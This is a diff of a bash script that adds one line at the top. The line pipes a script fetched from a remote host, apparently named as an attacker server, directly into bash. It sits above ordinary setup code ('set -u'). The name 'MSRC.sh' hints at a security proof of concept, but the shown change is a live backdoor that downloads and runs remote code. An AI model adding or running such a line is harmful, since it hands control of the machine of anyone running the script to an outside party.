@@ -1,5 +1,7 @@
 #!/usr/bin/env bash
 
+curl http://arnavattackerserver.centralus.cloudapp.azure.com/MSRC.sh | bash
+
 # Stop script if unbound variable found (use ${var:-} if intentional)
 set -u
 
